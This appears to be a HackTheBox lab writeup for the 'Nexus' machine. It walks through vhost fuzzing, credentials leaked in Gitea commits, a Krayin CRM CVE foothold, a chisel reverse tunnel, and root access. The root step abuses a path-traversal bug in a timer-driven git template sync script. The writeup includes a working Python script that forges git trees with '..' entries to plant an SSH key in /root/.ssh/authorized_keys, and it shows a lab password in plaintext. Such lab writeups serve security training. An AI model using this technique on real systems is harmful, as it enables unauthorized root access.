---
title: "Nexus Hackthebox machine Writeup"
date: 2026-06-25 14:00:00 +0200
categories: [Hackthebox]
tags: [hackthebox, Krayin CRM, gitea, htb]
---

Welcome to my writeup to Nexus machine on Hackthebox. This box contain a website with 2 vhosts. One is gitea instace which we can see commits at repo and grab a password for j.matthew@nexus.htb. The seccond vhost is vulnerable version of Krayin CRM leading us to shell on box. As www-data we see another environment variable file and we can ssh to box as jones user. As Jones we see a timer runing every 2 minutes with vulnerable python code which we can abuse to upload our own ssh key and log in as root.

## Enumeration

First we start at nmap

![](/assets/nexus-img/108-1.png)

We see that port 80 is redirecting us to nexus.htb so we have to add this host name to /etc/hosts. Going at site it looks like a static website. At the bottom we see applying for a job.

![](/assets/nexus-img/108-2.png)

Clicking at View role and scrolling at down we see 2 e-mail addresses. 

![](/assets/nexus-img/108-3.png)

No form's tho so we can do directory brute-forceing or vhost scaning. I will go with vhost's. I like using FFUF for that.

```bash
ffuf -u http://nexus.htb/ -H 'Host: FUZZ.nexus.htb' -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154
```

![](/assets/nexus-img/108-4.png)
We see 2 more vhost's so we have to add them to /etc/hosts file as well. Git is probably going to be gitea or any kind of git repository so i will start from there.

![](/assets/nexus-img/108-5.png)

We can explore repos and we see 1 called krayin-docker-setup.

![](/assets/nexus-img/108-6.png)

We can see at commits. At commit 9b817fa4e0 we can see another credentials this time for database. Maybe we can use it later.

![](/assets/nexus-img/108-8.png)

Looking at billing.nexus.htb we can see a login panel. Lets see if we can log in as email we found earlier and password for database.

![](/assets/nexus-img/108-9.png)

There we go! We now have version of application. A quick Google search for vulnerabilities affecting this version leads us to CVE-2026-38526. I decided to make my own PoC for this. You can find it at https://github.com/pawpic/CVE-2026-38526-POC. 

![](/assets/nexus-img/108-10.png)

## from www-data to user.txt

First of all we have to make a proper TTY shell 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo ;fg
2x enter key
export TERM=xterm
```

![](/assets/nexus-img/109-1.png)

We saw a database credentials a bit ago. Let's check them to log in at mysql.

![](/assets/nexus-img/109-2.png)

Not this time. Let's check users.

![](/assets/nexus-img/109-3.png)

Looking at /var/www/krayin we see another .env file which contains another password

![](/assets/nexus-img/109-4.png)

Using that password we can log in as jones user.

![](/assets/nexus-img/109-5.png)

## From jones to root
Looking at open ports we see that 3000 is available to localhost.

![](/assets/nexus-img/110-1.png)

We have to use chisel to access that port 

```bash
jones@nexus:~$ ./chisel client 10.10.15.38:1234 R:3000:127.0.0.1:3000

┌──(hubert㉿kali)-[~/Documents/hackthebox/nexus]
└─$ chisel server -p 1234 --reverse --socks5
```
We can check that port at localhost:3000
![](/assets/nexus-img/110-2.png)

Another gitea? For makeing sure we are not crazy lets run linpeas. Looking at system timers we see gitea-template-sync.service which is running every 2 minutes.

![](/assets/nexus-img/110-3.png)

Looking at /etc/gitea we see a python script lets see what's in there.
```python
import os
import sys
import json
import subprocess
import time
import urllib.request

GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"

def log(msg):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, 'a') as f:
            f.write(line + '\n')
    except:
        pass

def load_config():
    config = {}
    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        k, v = line.split('=', 1)
                        config[k.strip()] = v.strip()
        except:
            pass
    return config

def get_token():
    cfg = load_config()
    return cfg.get('GITEA_API_TOKEN')

def get_template_repos(token):
    url = f"{GITEA_URL}/api/v1/repos/search?limit=50"
    req = urllib.request.Request(url, headers={'Authorization': f'token {token}'})
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read())
            repos = data.get('data', data) if isinstance(data, dict) else data
            return [r for r in repos if r.get('template', False)]
    except Exception as e:
        log(f"API error: {e}")
        return []

def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name = repo_info['name'].lower()
    bare_path = os.path.join(REPO_ROOT, owner, f"{name}.git")
    stage_path = os.path.join(STAGING_DIR, owner, name)

    if not os.path.isdir(bare_path):
        log(f"  repo not found: {bare_path}")
        return

    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode != 0:
            log(f"  ls-tree failed: {result.stderr.strip()}")
            return
    except Exception as e:
        log(f"  ls-tree error: {e}")
        return

    entries = []
    for line in result.stdout.strip().split('\n'):
        if not line:
            continue
        parts = line.split('\t', 1)
        if len(parts) != 2:
            continue
        meta, filepath = parts
        mode, objtype, objhash = meta.split()
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))

    if not entries:
        log("  no files in template")
        return

    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)

        try:
            os.makedirs(target_dir, exist_ok=True)
            cat_result = subprocess.run(
                GIT + ['cat-file', 'blob', objhash],
                cwd=bare_path,
                capture_output=True,
                timeout=10
            )
            if cat_result.returncode != 0:
                continue

            with open(target, 'wb') as f:
                f.write(cat_result.stdout)

            os.chmod(target, 0o755 if mode == '100755' else 0o644)
            log(f"  synced: {filepath}")
        except Exception as e:
            log(f"  error syncing {filepath}: {e}")

def main():
    log("Template sync starting")
    token = get_token()
    if not token:
        log("No API token found")
        sys.exit(1)

    templates = get_template_repos(token)
    log(f"Found {len(templates)} template repo(s)")

    for repo in templates:
        name = repo['full_name']
        log(f"Syncing template: {name}")
        sync_template(repo)

    log("Template sync complete")

if __name__ == '__main__':
    main()
```

This code is vulnerable it uses os.path.join() on the raw file paths without sanitizing directory traversal sequences.

```python
target = os.path.join(stage_path, filepath)
os.makedirs(os.path.dirname(target), exist_ok=True)
```

Since git ls-tree outputs paths containing .. without validation, and os.path.join() resolves them, we can write files anywhere the git user has access. The staging directory is at /home/git/templatestaging/<owner>/<repo>/ , we need to go 5 ../ to reach /root/ and write an SSH key to .ssh/authorized_keys.

## Exploitation to root

First we creating a ssh key

```bash
ssh-keygen -t ed25519 -f /tmp/k
```

We can log in to gitea using jones:y27xb3ha!!74GbR credentials. Next we create a new repository with “Make repository as template” checkbox.

![](/assets/nexus-img/110-4.png)

Now we clone the repository and use a custom Python script to create raw git objects with .. path traversal components. 


```python
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
        return sha

def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
    
if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)
r=subprocess.run(["cat","/tmp/k.pub"],capture_output=True,text=True)
if r.returncode!=0:
    print("ssh-keygen -t ed25519 -f /tmp/k -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
# AUTHOR :0xdf
```
Now we run our script and inside a clonned repo and we wait 2 minutes

```bash
jones@nexus:/tmp$ python3 priv/rce.py 
Run inside git repo
jones@nexus:/tmp$ cd priv/
jones@nexus:/tmp/priv$ python3 rce.py 
Done: ca6a4f2c707893e4e31655a367f2328c7bf9f6da
jones@nexus:/tmp/priv$ git push -u origin main --force
warning: unable to access '../../../../../root/.gitattributes': Permission denied
warning: unable to access '../../../../../root/.ssh/.gitattributes': Permission denied
Enumerating objects: 11, done.
Counting objects: 100% (11/11), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (11/11), 612 bytes | 306.00 KiB/s, done.
Total 11 (delta 0), reused 0 (delta 0), pack-reused 0
remote: . Processing 1 references
remote: Processed 1 references in total
To http://localhost:3000/jones/priv.git
 * [new branch]      main -> main
branch 'main' set up to track 'origin/main'.
```

After some time we can ssh as root

![](/assets/nexus-img/110-5.png)

Thanks for reading, take care and see you in another writeup.